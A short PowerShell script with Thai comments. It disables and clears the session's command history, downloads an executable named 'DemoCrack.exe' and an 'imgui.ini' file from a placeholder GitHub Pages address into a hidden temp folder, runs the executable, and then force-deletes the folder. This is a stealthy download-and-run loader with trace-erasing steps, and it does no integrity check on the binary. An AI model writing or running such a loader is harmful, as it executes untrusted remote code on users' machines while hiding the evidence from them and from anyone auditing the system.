# ปิดการบันทึก history (เฉพาะ session นี้)
if (Get-Module -ListAvailable -Name PSReadLine) {
    Import-Module PSReadLine -ErrorAction SilentlyContinue
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    Clear-History
}

# ---- ตั้งค่า URL ----
$base = "https://<username>.github.io/<repo>"
$exeUrl = "$base/DemoCrack.exe"
$iniUrl = "$base/imgui.ini"

# โฟลเดอร์ชั่วคราว
$tempDir = Join-Path $env:TEMP "runpkg_$([guid]::NewGuid().ToString('N'))"
New-Item -ItemType Directory -Path $tempDir | Out-Null

$exePath = Join-Path $tempDir "DemoCrack.exe"
$iniPath = Join-Path $tempDir "imgui.ini"

# ดาวน์โหลดไฟล์
Invoke-WebRequest $exeUrl -OutFile $exePath
Invoke-WebRequest $iniUrl -OutFile $iniPath

# รันและรอจนจบ
$proc = Start-Process -FilePath $exePath -WorkingDirectory $tempDir -PassThru
$proc.WaitForExit()

# ลบไฟล์ชั่วคราว
Remove-Item -Recurse -Force $tempDir
